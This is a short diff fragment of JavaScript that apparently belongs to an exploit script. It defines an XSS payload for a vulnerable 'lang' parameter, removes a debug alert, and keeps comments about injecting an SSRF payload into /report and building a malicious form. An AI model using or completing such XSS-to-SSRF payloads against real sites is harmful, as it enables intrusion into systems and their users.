@@ -7,7 +7,6 @@
             // Define the XSS payload with proper encoding for the vulnerable 'lang' parameter
             const xssPayload = `"; 
                 try {
-                    alert("[Debug] XSS executed successfully!");
                     console.log("[Debug] Injecting SSRF payload into /report...");
 
                     // Start creating the malicious form
